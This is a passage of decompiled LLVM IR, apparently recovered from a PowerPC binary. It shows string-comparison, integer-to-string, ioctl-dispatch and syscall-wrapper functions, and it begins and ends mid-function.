  %v0_10007968 = phi i32 [ %v1_10007968, %dec_label_pc_10007968 ], [ 0, %dec_label_pc_10007958 ]
  %v1_10007968 = add i32 %v0_10007968, 1
  %v2_1000796c = add i32 %v1_10007968, %arg2
  %v3_1000796c = inttoptr i32 %v2_1000796c to i8*
  %v4_1000796c = load i8, i8* %v3_1000796c, align 1
  %v3_10007970 = icmp eq i8 %v4_1000796c, 0
  br i1 %v3_10007970, label %dec_label_pc_10007978, label %dec_label_pc_10007968

dec_label_pc_10007978:                            ; preds = %dec_label_pc_10007968, %dec_label_pc_10007958
  %v0_1000797c = phi i32 [ 0, %dec_label_pc_10007958 ], [ %v1_10007968, %dec_label_pc_10007968 ]
  %v4_10007978 = icmp eq i32 %v0_10007978, %v0_1000797c
  br i1 %v4_10007978, label %dec_label_pc_10007990, label %dec_label_pc_10007988

dec_label_pc_10007988:                            ; preds = %dec_label_pc_10007994, %dec_label_pc_10007978
  ret i32 0

dec_label_pc_10007990:                            ; preds = %dec_label_pc_10007978
  %v2_10007990 = icmp eq i32 %v0_10007978, 0
  br i1 %v2_10007990, label %dec_label_pc_100079b0, label %dec_label_pc_10007994

dec_label_pc_10007994:                            ; preds = %dec_label_pc_10007990, %dec_label_pc_100079ac
  %v0_100079ac = phi i32 [ %v1_100079ac, %dec_label_pc_100079ac ], [ %v0_10007978, %dec_label_pc_10007990 ]
  %v0_1000799c = phi i32 [ %v1_100079a0, %dec_label_pc_100079ac ], [ %arg2, %dec_label_pc_10007990 ]
  %v0_10007994 = phi i32 [ %v1_10007998, %dec_label_pc_100079ac ], [ %tmp, %dec_label_pc_10007990 ]
  %v1_10007994 = inttoptr i32 %v0_10007994 to i8*
  %v2_10007994 = load i8, i8* %v1_10007994, align 1
  %v1_1000799c = inttoptr i32 %v0_1000799c to i8*
  %v2_1000799c = load i8, i8* %v1_1000799c, align 1
  %v4_100079a4 = icmp eq i8 %v2_10007994, %v2_1000799c
  br i1 %v4_100079a4, label %dec_label_pc_100079ac, label %dec_label_pc_10007988

dec_label_pc_100079ac:                            ; preds = %dec_label_pc_10007994
  %v1_100079a0 = add i32 %v0_1000799c, 1
  %v1_10007998 = add i32 %v0_10007994, 1
  %v1_100079ac = add i32 %v0_100079ac, -1
  %v2_100079ac = icmp eq i32 %v1_100079ac, 0
  br i1 %v2_100079ac, label %dec_label_pc_100079b0, label %dec_label_pc_10007994

dec_label_pc_100079b0:                            ; preds = %dec_label_pc_100079ac, %dec_label_pc_10007990
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_100079ac, { 1, 0 }
  uselistorder i32 %v0_10007994, { 1, 0 }
  uselistorder i32 %v0_1000799c, { 1, 0 }
  uselistorder label %dec_label_pc_10007994, { 1, 0 }
  uselistorder label %dec_label_pc_10007968, { 1, 0 }
  uselistorder label %dec_label_pc_10007948, { 1, 0 }
}

define i32 @function_100079b8(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100079b8:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_100079b8 = load i8, i8* %arg1, align 1
  %v3_100079c0 = icmp eq i8 %v2_100079b8, 0
  br i1 %v3_100079c0, label %dec_label_pc_100079d8, label %dec_label_pc_100079c8

dec_label_pc_100079c8:                            ; preds = %dec_label_pc_100079b8, %dec_label_pc_100079c8
  %v0_100079c8 = phi i32 [ %v1_100079c8, %dec_label_pc_100079c8 ], [ 0, %dec_label_pc_100079b8 ]
  %v1_100079c8 = add i32 %v0_100079c8, 1
  %v2_100079cc = add i32 %v1_100079c8, %tmp
  %v3_100079cc = inttoptr i32 %v2_100079cc to i8*
  %v4_100079cc = load i8, i8* %v3_100079cc, align 1
  %v3_100079d0 = icmp eq i8 %v4_100079cc, 0
  br i1 %v3_100079d0, label %dec_label_pc_100079d8, label %dec_label_pc_100079c8

dec_label_pc_100079d8:                            ; preds = %dec_label_pc_100079c8, %dec_label_pc_100079b8
  %v1_100079f8 = phi i32 [ 0, %dec_label_pc_100079b8 ], [ %v1_100079c8, %dec_label_pc_100079c8 ]
  %v1_100079d8 = inttoptr i32 %arg2 to i8*
  %v2_100079d8 = load i8, i8* %v1_100079d8, align 1
  %v3_100079e0 = icmp eq i8 %v2_100079d8, 0
  br i1 %v3_100079e0, label %dec_label_pc_100079f8, label %dec_label_pc_100079e8

dec_label_pc_100079e8:                            ; preds = %dec_label_pc_100079d8, %dec_label_pc_100079e8
  %v0_100079e8 = phi i32 [ %v1_100079e8, %dec_label_pc_100079e8 ], [ 0, %dec_label_pc_100079d8 ]
  %v1_100079e8 = add i32 %v0_100079e8, 1
  %v2_100079ec = add i32 %v1_100079e8, %arg2
  %v3_100079ec = inttoptr i32 %v2_100079ec to i8*
  %v4_100079ec = load i8, i8* %v3_100079ec, align 1
  %v3_100079f0 = icmp eq i8 %v4_100079ec, 0
  br i1 %v3_100079f0, label %dec_label_pc_100079f8, label %dec_label_pc_100079e8

dec_label_pc_100079f8:                            ; preds = %dec_label_pc_100079e8, %dec_label_pc_100079d8
  %v1_10007a00 = phi i32 [ 0, %dec_label_pc_100079d8 ], [ %v1_100079e8, %dec_label_pc_100079e8 ]
  %v3_100079f8 = icmp slt i32 %v1_100079f8, %arg3
  br i1 %v3_100079f8, label %dec_label_pc_10007a2c, label %dec_label_pc_10007a00

dec_label_pc_10007a00:                            ; preds = %dec_label_pc_100079f8
  %v3_10007a00 = icmp slt i32 %v1_10007a00, %arg3
  %v1_10007a04 = add i32 %arg3, 1
  br i1 %v3_10007a00, label %dec_label_pc_10007a2c, label %dec_label_pc_10007a10

dec_label_pc_10007a10:                            ; preds = %dec_label_pc_10007a00, %dec_label_pc_10007a14
  %v0_10007a1c = phi i32 [ %v1_10007a20, %dec_label_pc_10007a14 ], [ %arg2, %dec_label_pc_10007a00 ]
  %v0_10007a14 = phi i32 [ %v1_10007a18, %dec_label_pc_10007a14 ], [ %tmp, %dec_label_pc_10007a00 ]
  %v0_10007a10 = phi i32 [ %v1_10007a10, %dec_label_pc_10007a14 ], [ %v1_10007a04, %dec_label_pc_10007a00 ]
  %v1_10007a10 = add i32 %v0_10007a10, -1
  %v2_10007a10 = icmp eq i32 %v1_10007a10, 0
  br i1 %v2_10007a10, label %dec_label_pc_10007a34, label %dec_label_pc_10007a14

dec_label_pc_10007a14:                            ; preds = %dec_label_pc_10007a10
  %v1_10007a14 = inttoptr i32 %v0_10007a14 to i8*
  %v2_10007a14 = load i8, i8* %v1_10007a14, align 1
  %v1_10007a18 = add i32 %v0_10007a14, 1
  %v1_10007a1c = inttoptr i32 %v0_10007a1c to i8*
  %v2_10007a1c = load i8, i8* %v1_10007a1c, align 1
  %v1_10007a20 = add i32 %v0_10007a1c, 1
  %v4_10007a24 = icmp eq i8 %v2_10007a14, %v2_10007a1c
  br i1 %v4_10007a24, label %dec_label_pc_10007a10, label %dec_label_pc_10007a2c

dec_label_pc_10007a2c:                            ; preds = %dec_label_pc_10007a14, %dec_label_pc_10007a00, %dec_label_pc_100079f8
  ret i32 0

dec_label_pc_10007a34:                            ; preds = %dec_label_pc_10007a10
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_10007a10, { 1, 0 }
  uselistorder i32 %v0_10007a14, { 1, 0 }
  uselistorder i32 %v0_10007a1c, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10007a10, { 1, 0 }
  uselistorder label %dec_label_pc_100079e8, { 1, 0 }
  uselistorder label %dec_label_pc_100079c8, { 1, 0 }
}

define i32 @function_10007a3c(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10007a3c:
  %cr6_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to i8*
  store i32 %arg3, i32* @r5, align 4
  %tmp17 = sext i8 %arg1 to i32
  store i32 %tmp17, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10007a3c = icmp eq i32 %arg3, 0
  %v4_10007a40 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10007a40, i32* %stack_var_-64, align 4
  %v5_10007a40 = ptrtoint i32* %stack_var_-64 to i32
  br i1 %v4_10007a3c, label %dec_label_pc_10007a5c, label %dec_label_pc_10007a48

dec_label_pc_10007a48:                            ; preds = %dec_label_pc_10007a3c
  %v0_10007a48 = load i32, i32* %r3.global-to-local, align 4
  %v3_10007a48 = icmp eq i32 %v0_10007a48, 0
  store i1 %v3_10007a48, i1* %cr6_eq.global-to-local, align 1
  br i1 %v3_10007a48, label %dec_label_pc_10007a50, label %dec_label_pc_10007a68

dec_label_pc_10007a50:                            ; preds = %dec_label_pc_10007a48
  store i32 48, i32* %r0.global-to-local, align 4
  %v4_10007a54 = add i32 %arg3, 1
  %v5_10007a54 = inttoptr i32 %v4_10007a54 to i8*
  store i8 0, i8* %v5_10007a54, align 1
  %v0_10007a58 = load i32, i32* %r0.global-to-local, align 4
  %v1_10007a58 = trunc i32 %v0_10007a58 to i8
  store i8 %v1_10007a58, i8* %tmp, align 1
  br label %dec_label_pc_10007a5c

dec_label_pc_10007a5c:                            ; preds = %dec_label_pc_10007a3c, %dec_label_pc_10007ae8, %dec_label_pc_10007a50
  store i32 %arg3, i32* %r3.global-to-local, align 4
  ret i32 %arg3

dec_label_pc_10007a68:                            ; preds = %dec_label_pc_10007a48
  %v2_10007a48 = icmp sgt i32 %v0_10007a48, 0
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10007a68.not = icmp ne i32 %arg2, 10
  %brmerge = or i1 %v2_10007a48, %v3_10007a68.not
  br i1 %brmerge, label %dec_label_pc_10007a7c, label %dec_label_pc_10007b30

dec_label_pc_10007a7c:                            ; preds = %dec_label_pc_10007a68, %dec_label_pc_10007b30
  %v0_10007a802 = phi i32 [ %v0_10007a48, %dec_label_pc_10007a68 ], [ %v1_10007b30, %dec_label_pc_10007b30 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_10007a68 ], [ 1, %dec_label_pc_10007b30 ]
  store i32 %storemerge, i32* %r8.global-to-local, align 4
  store i32 32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10007a80

dec_label_pc_10007a80:                            ; preds = %dec_label_pc_10007aac.dec_label_pc_10007a80_crit_edge, %dec_label_pc_10007a7c
  %v1_10007a84 = phi i32 [ %v1_10007a84.pre, %dec_label_pc_10007aac.dec_label_pc_10007a80_crit_edge ], [ 32, %dec_label_pc_10007a7c ]
  %v0_10007a84 = phi i32 [ %v0_10007a84.pre, %dec_label_pc_10007aac.dec_label_pc_10007a80_crit_edge ], [ %v5_10007a40, %dec_label_pc_10007a7c ]
  %v1_10007a94 = phi i32 [ %v0_10007a80.pre, %dec_label_pc_10007aac.dec_label_pc_10007a80_crit_edge ], [ %v0_10007a802, %dec_label_pc_10007a7c ]
  %v2_10007a80 = udiv i32 %v1_10007a94, %arg2
  %v2_10007a84 = add i32 %v0_10007a84, %v1_10007a84
  store i32 %v2_10007a84, i32* %r11.global-to-local, align 4
  %v1_10007a88 = add i32 %v1_10007a84, -1
  store i32 %v1_10007a88, i32* %r10.global-to-local, align 4
  %v2_10007a8c = mul i32 %v2_10007a80, %arg2
  %v3_10007a90 = icmp ult i32 %v1_10007a94, %arg2
  store i1 %v3_10007a90, i1* %cr6_eq.global-to-local, align 1
  %v2_10007a94 = sub i32 %v1_10007a94, %v2_10007a8c
  store i32 %v2_10007a94, i32* %r9.global-to-local, align 4
  store i32 %v2_10007a80, i32* %r3.global-to-local, align 4
  %tmp22 = icmp slt i32 %v2_10007a94, 10
  %storemerge15.v = select i1 %tmp22, i32 48, i32 55
  %storemerge15 = add i32 %storemerge15.v, %v2_10007a94
  %v0_10007aac.off0 = trunc i32 %storemerge15 to i8
  store i32 %storemerge15, i32* %r0.global-to-local, align 4
  %v3_10007aac = add i32 %v2_10007a84, 8
  %v4_10007aac = inttoptr i32 %v3_10007aac to i8*
  store i8 %v0_10007aac.off0, i8* %v4_10007aac, align 1
  %v0_10007ab0 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_10007ab0, label %dec_label_pc_10007ab4, label %dec_label_pc_10007aac.dec_label_pc_10007a80_crit_edge

dec_label_pc_10007aac.dec_label_pc_10007a80_crit_edge: ; preds = %dec_label_pc_10007a80
  %v0_10007a80.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_10007a84.pre = load i32, i32* @r1, align 4
  %v1_10007a84.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10007a80

dec_label_pc_10007ab4:                            ; preds = %dec_label_pc_10007a80
  %v0_10007ab4 = load i32, i32* %r8.global-to-local, align 4
  %v3_10007ab4 = icmp eq i32 %v0_10007ab4, 0
  br i1 %v3_10007ab4, label %dec_label_pc_10007abc, label %dec_label_pc_10007b1c

dec_label_pc_10007abc:                            ; preds = %dec_label_pc_10007ab4
  %v0_10007abc = load i32, i32* %r10.global-to-local, align 4
  %v1_10007abc = add i32 %v0_10007abc, 1
  store i32 %v1_10007abc, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10007ac0

dec_label_pc_10007ac0:                            ; preds = %dec_label_pc_10007b1c, %dec_label_pc_10007abc
  %v1_10007ac8 = phi i32 [ %v1_10007ac4.pre, %dec_label_pc_10007b1c ], [ %v1_10007abc, %dec_label_pc_10007abc ]
  %v2_10007ac0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10007ac0, i32* %r9.global-to-local, align 4
  %v2_10007ac4 = add i32 %v1_10007ac8, %v2_10007ac0
  %v3_10007ac4 = inttoptr i32 %v2_10007ac4 to i8*
  %v4_10007ac4 = load i8, i8* %v3_10007ac4, align 1
  %v5_10007ac4 = zext i8 %v4_10007ac4 to i32
  store i32 %v5_10007ac4, i32* %r0.global-to-local, align 4
  store i32 %v2_10007ac4, i32* %r9.global-to-local, align 4
  %v3_10007acc = icmp eq i8 %v4_10007ac4, 0
  br i1 %v3_10007acc, label %dec_label_pc_10007b44, label %dec_label_pc_10007ad4

dec_label_pc_10007ad4:                            ; preds = %dec_label_pc_10007ac0
  store i32 0, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10007ad8

dec_label_pc_10007ad8:                            ; preds = %dec_label_pc_10007ad8, %dec_label_pc_10007ad4
  %v0_10007ad8 = phi i32 [ %v1_10007ad8, %dec_label_pc_10007ad8 ], [ 0, %dec_label_pc_10007ad4 ]
  %v1_10007ad8 = add i32 %v0_10007ad8, 1
  store i32 %v1_10007ad8, i32* %r10.global-to-local, align 4
  %v2_10007adc = add i32 %v1_10007ad8, %v2_10007ac4
  %v3_10007adc = inttoptr i32 %v2_10007adc to i8*
  %v4_10007adc = load i8, i8* %v3_10007adc, align 1
  %v5_10007adc = zext i8 %v4_10007adc to i32
  store i32 %v5_10007adc, i32* %r0.global-to-local, align 4
  %v3_10007ae0 = icmp eq i8 %v4_10007adc, 0
  br i1 %v3_10007ae0, label %dec_label_pc_10007ae8, label %dec_label_pc_10007ad8

dec_label_pc_10007ae8:                            ; preds = %dec_label_pc_10007ad8
  %v3_10007ae8 = icmp eq i32 %v1_10007ad8, -1
  br i1 %v3_10007ae8, label %dec_label_pc_10007a5c, label %dec_label_pc_10007af0

dec_label_pc_10007af0:                            ; preds = %dec_label_pc_10007ae8
  store i32 %arg3, i32* %r11.global-to-local, align 4
  %phitmp = add i32 %v0_10007ad8, 2
  br label %dec_label_pc_10007af4

dec_label_pc_10007af4:                            ; preds = %dec_label_pc_10007b44, %dec_label_pc_10007af0
  %v0_10007af4 = phi i32 [ 1, %dec_label_pc_10007b44 ], [ %phitmp, %dec_label_pc_10007af0 ]
  store i32 %v0_10007af4, i32* %r10.global-to-local, align 4
  store i32 %v0_10007af4, i32* %ctr.global-to-local, align 4
  %v2_10007afc24 = load i8, i8* %v3_10007ac4, align 1
  %v3_10007afc25 = zext i8 %v2_10007afc24 to i32
  store i32 %v3_10007afc25, i32* %r0.global-to-local, align 4
  %v1_10007b0026 = add i32 %v2_10007ac4, 1
  store i32 %v1_10007b0026, i32* %r9.global-to-local, align 4
  store i8 %v2_10007afc24, i8* %tmp, align 1
  %v0_10007b0828 = load i32, i32* %r11.global-to-local, align 4
  %v1_10007b0829 = add i32 %v0_10007b0828, 1
  store i32 %v1_10007b0829, i32* %r11.global-to-local, align 4
  %v0_10007b0c30 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10007b0c31 = add i32 %v0_10007b0c30, -1
  store i32 %v1_10007b0c31, i32* %ctr.global-to-local, align 4
  %v2_10007b0c32 = icmp eq i32 %v1_10007b0c31, 0
  br i1 %v2_10007b0c32, label %dec_label_pc_10007b10, label %dec_label_pc_10007afc.dec_label_pc_10007afc_crit_edge

dec_label_pc_10007afc.dec_label_pc_10007afc_crit_edge: ; preds = %dec_label_pc_10007af4, %dec_label_pc_10007afc.dec_label_pc_10007afc_crit_edge
  %v1_10007b0833 = phi i32 [ %v1_10007b08, %dec_label_pc_10007afc.dec_label_pc_10007afc_crit_edge ], [ %v1_10007b0829, %dec_label_pc_10007af4 ]
  %v0_10007afc.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_10007afc = inttoptr i32 %v0_10007afc.pre to i8*
  %v2_10007afc = load i8, i8* %v1_10007afc, align 1
  %v3_10007afc = zext i8 %v2_10007afc to i32
  store i32 %v3_10007afc, i32* %r0.global-to-local, align 4
  %v1_10007b00 = add i32 %v0_10007afc.pre, 1
  store i32 %v1_10007b00, i32* %r9.global-to-local, align 4
  %v3_10007b04 = inttoptr i32 %v1_10007b0833 to i8*
  store i8 %v2_10007afc, i8* %v3_10007b04, align 1
  %v0_10007b08 = load i32, i32* %r11.global-to-local, align 4
  %v1_10007b08 = add i32 %v0_10007b08, 1
  store i32 %v1_10007b08, i32* %r11.global-to-local, align 4
  %v0_10007b0c = load i32, i32* %ctr.global-to-local, align 4
  %v1_10007b0c = add i32 %v0_10007b0c, -1
  store i32 %v1_10007b0c, i32* %ctr.global-to-local, align 4
  %v2_10007b0c = icmp eq i32 %v1_10007b0c, 0
  br i1 %v2_10007b0c, label %dec_label_pc_10007b10, label %dec_label_pc_10007afc.dec_label_pc_10007afc_crit_edge

dec_label_pc_10007b10:                            ; preds = %dec_label_pc_10007afc.dec_label_pc_10007afc_crit_edge, %dec_label_pc_10007af4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  ret i32 %arg3

dec_label_pc_10007b1c:                            ; preds = %dec_label_pc_10007ab4
  %v0_10007b1c.pre = load i32, i32* @r1, align 4
  %v1_10007b1c.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_10007b1c = add i32 %v1_10007b1c.pre, %v0_10007b1c.pre
  store i32 %v2_10007b1c, i32* %r9.global-to-local, align 4
  store i32 45, i32* %r0.global-to-local, align 4
  %v3_10007b24 = add i32 %v2_10007b1c, 8
  %v4_10007b24 = inttoptr i32 %v3_10007b24 to i8*
  store i8 45, i8* %v4_10007b24, align 1
  %v1_10007ac4.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10007ac0

dec_label_pc_10007b30:                            ; preds = %dec_label_pc_10007a68
  %v1_10007b30 = sub i32 0, %v0_10007a48
  store i32 %v1_10007b30, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10007a7c

dec_label_pc_10007b44:                            ; preds = %dec_label_pc_10007ac0
  store i32 %arg3, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10007af4

; uselistorder directives
  uselistorder i32 %v1_10007b30, { 1, 0 }
  uselistorder i32 %v1_10007b0c, { 1, 0 }
  uselistorder i32 %v1_10007b08, { 1, 0 }
  uselistorder i32 %v0_10007af4, { 1, 0 }
  uselistorder i32 %v1_10007ad8, { 0, 1, 3, 2 }
  uselistorder i32 %v2_10007a80, { 1, 0 }
  uselistorder i32 %v1_10007a94, { 1, 0, 2 }
  uselistorder i32 %v1_10007a84, { 1, 0 }
  uselistorder i32 %v0_10007a48, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 2, 4, 3, 0, 5, 6, 1 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 2, 3, 4, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 2, 4, 3, 0, 5, 6, 1 }
  uselistorder i32* %r10.global-to-local, { 6, 7, 2, 1, 8, 9, 11, 10, 3, 0, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 0, 7, 8, 1, 2, 3, 4 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32 45, { 3, 2, 0, 4, 1, 5 }
  uselistorder i32 %arg3, { 1, 4, 5, 6, 2, 3, 0, 7, 9, 8 }
  uselistorder i32 %arg2, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_10007afc.dec_label_pc_10007afc_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10007a7c, { 1, 0 }
  uselistorder label %dec_label_pc_10007a5c, { 1, 2, 0 }
}

define i32 @function_10007b50(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10007b50:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-32 = alloca i32, align 4
  %v4_10007b60 = icmp eq i32 %arg2, -2143521772
  %v2_10007b74 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10007b74, i32* %stack_var_-32, align 4
  br i1 %v4_10007b60, label %dec_label_pc_10007bd4, label %dec_label_pc_10007b94

dec_label_pc_10007b94:                            ; preds = %dec_label_pc_10007b50
  %v3_10007b94 = icmp ugt i32 %arg2, -2143521772
  br i1 %v3_10007b94, label %dec_label_pc_10007bac, label %dec_label_pc_10007b9c

dec_label_pc_10007b9c:                            ; preds = %dec_label_pc_10007b94
  %v3_10007ba0 = icmp eq i32 %arg2, 1077703699
  br i1 %v3_10007ba0, label %dec_label_pc_10007bc8, label %dec_label_pc_10007bf4

dec_label_pc_10007bac:                            ; preds = %dec_label_pc_10007b94
  %v1_10007bac = xor i32 %arg2, -2143551488
  %v3_10007bb0 = icmp eq i32 %v1_10007bac, 29717
  br i1 %v3_10007bb0, label %dec_label_pc_10007be4, label %dec_label_pc_10007bb8

dec_label_pc_10007bb8:                            ; preds = %dec_label_pc_10007bac
  %v3_10007bbc = icmp eq i32 %v1_10007bac, 29718
  br i1 %v3_10007bbc, label %dec_label_pc_10007bec, label %dec_label_pc_10007bf4

dec_label_pc_10007bc8:                            ; preds = %dec_label_pc_10007b9c
  store i32 ptrtoint (i32* @global_var_10007bd0.359 to i32), i32* @lr, align 4
  %v2_10007bcc = inttoptr i32 %arg3 to i32*
  %v3_10007bcc = call i32 @function_10008698(i32* %v2_10007bcc, i32 %arg1)
  br label %dec_label_pc_10007bdc

dec_label_pc_10007bd4:                            ; preds = %dec_label_pc_10007b50
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_10007bd8

dec_label_pc_10007bd8:                            ; preds = %dec_label_pc_10007bec, %dec_label_pc_10007be4, %dec_label_pc_10007bd4
  store i32 268467164, i32* @lr, align 4
  %v0_10007bd8 = call i32 @function_10008734()
  br label %dec_label_pc_10007bdc

dec_label_pc_10007bdc:                            ; preds = %dec_label_pc_10007bc8, %dec_label_pc_10007bd8
  %storemerge = phi i32 [ %v0_10007bd8, %dec_label_pc_10007bd8 ], [ %v3_10007bcc, %dec_label_pc_10007bc8 ]
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007c20

dec_label_pc_10007be4:                            ; preds = %dec_label_pc_10007bac
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_10007bd8

dec_label_pc_10007bec:                            ; preds = %dec_label_pc_10007bb8
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_10007bd8

dec_label_pc_10007bf4:                            ; preds = %dec_label_pc_10007bb8, %dec_label_pc_10007b9c
  %v0_10007c04 = call i32 @__asm_mfcr()
  %v1_10007c08 = and i32 %v0_10007c04, 268435456
  %v3_10007c08 = icmp eq i32 %v1_10007c08, 0
  store i32 %v0_10007c04, i32* %r31.global-to-local, align 4
  br i1 %v3_10007c08, label %dec_label_pc_10007c20, label %dec_label_pc_10007c14

dec_label_pc_10007c14:                            ; preds = %dec_label_pc_10007bf4
  %v0_10007c14 = call i32 @function_10008484()
  %v0_10007c18 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007c18 = inttoptr i32 %v0_10007c14 to i32*
  store i32 %v0_10007c18, i32* %v2_10007c18, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007c20

dec_label_pc_10007c20:                            ; preds = %dec_label_pc_10007bf4, %dec_label_pc_10007bdc, %dec_label_pc_10007c14
  %v0_10007c24 = phi i32 [ %v0_10007c04, %dec_label_pc_10007bf4 ], [ %storemerge, %dec_label_pc_10007bdc ], [ -1, %dec_label_pc_10007c14 ]
  ret i32 %v0_10007c24

; uselistorder directives
  uselistorder i32 %arg2, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10007c20, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10007bdc, { 1, 0 }
}

define i32 @function_10007c38(i32 %arg1) local_unnamed_addr {
dec_label_pc_10007c38:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_10007c4c = load i32, i32* @r4, align 4
  %v1_10007c4c = add i32 %v0_10007c4c, -12
  %v2_10007c50 = icmp ugt i32 %v1_10007c4c, 2
  %v2_10007c58 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10007c58, i32* %stack_var_-32, align 4
  br i1 %v2_10007c50, label %dec_label_pc_10007c84, label %dec_label_pc_10007c74

dec_label_pc_10007c74:                            ; preds = %dec_label_pc_10007c38
  store i32 268467324, i32* @lr, align 4
  %v2_10007c78 = call i32 @function_10007cbc(i32 3)
  store i32 %v2_10007c78, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007ca4

dec_label_pc_10007c84:                            ; preds = %dec_label_pc_10007c38
  %v0_10007c88 = call i32 @__asm_mfcr()
  %v1_10007c8c = and i32 %v0_10007c88, 268435456
  %v3_10007c8c = icmp eq i32 %v1_10007c8c, 0
  store i32 %v0_10007c88, i32* %r31.global-to-local, align 4
  br i1 %v3_10007c8c, label %dec_label_pc_10007ca4, label %dec_label_pc_10007c98

dec_label_pc_10007c98:                            ; preds = %dec_label_pc_10007c84
  %v0_10007c98 = call i32 @function_10008484()
  %v0_10007c9c = load i32, i32* %r31.global-to-local, align 4
  %v2_10007c9c = inttoptr i32 %v0_10007c98 to i32*
  store i32 %v0_10007c9c, i32* %v2_10007c9c, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007ca4

dec_label_pc_10007ca4:                            ; preds = %dec_label_pc_10007c84, %dec_label_pc_10007c74, %dec_label_pc_10007c98
  %v0_10007ca8 = phi i32 [ %v0_10007c88, %dec_label_pc_10007c84 ], [ %v2_10007c78, %dec_label_pc_10007c74 ], [ -1, %dec_label_pc_10007c98 ]
  ret i32 %v0_10007ca8

; uselistorder directives
  uselistorder label %dec_label_pc_10007ca4, { 2, 0, 1 }
}

define i32 @function_10007cbc(i32 %arg1) local_unnamed_addr {
dec_label_pc_10007cbc:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_10007cd4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10007cd4, i32* %stack_var_-32, align 4
  %v0_10007cf0 = call i32 @__asm_mfcr()
  %v1_10007cf4 = and i32 %v0_10007cf0, 268435456
  %v3_10007cf4 = icmp eq i32 %v1_10007cf4, 0
  store i32 %v0_10007cf0, i32* %r31.global-to-local, align 4
  br i1 %v3_10007cf4, label %dec_label_pc_10007d0c, label %dec_label_pc_10007d00

dec_label_pc_10007d00:                            ; preds = %dec_label_pc_10007cbc
  %v0_10007d00 = call i32 @function_10008484()
  %v0_10007d04 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007d04 = inttoptr i32 %v0_10007d00 to i32*
  store i32 %v0_10007d04, i32* %v2_10007d04, align 4
  br label %dec_label_pc_10007d0c

dec_label_pc_10007d0c:                            ; preds = %dec_label_pc_10007cbc, %dec_label_pc_10007d00
  %v0_10007d1c = phi i32 [ %v0_10007cf0, %dec_label_pc_10007cbc ], [ -1, %dec_label_pc_10007d00 ]
  ret i32 %v0_10007d1c

; uselistorder directives
  uselistorder label %dec_label_pc_10007d0c, { 1, 0 }
}

define i32 @function_10007d20(i32 %arg1) local_unnamed_addr {
dec_label_pc_10007d20:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007d38 = call i32 @__asm_mfcr()
  %v1_10007d3c = and i32 %v0_10007d38, 268435456
  %v3_10007d3c = icmp eq i32 %v1_10007d3c, 0
  store i32 %v0_10007d38, i32* %r31.global-to-local, align 4
  br i1 %v3_10007d3c, label %dec_label_pc_10007d54, label %dec_label_pc_10007d48

dec_label_pc_10007d48:                            ; preds = %dec_label_pc_10007d20
  %v0_10007d48 = call i32 @function_10008484()
  %v0_10007d4c = load i32, i32* %r31.global-to-local, align 4
  %v2_10007d4c = inttoptr i32 %v0_10007d48 to i32*
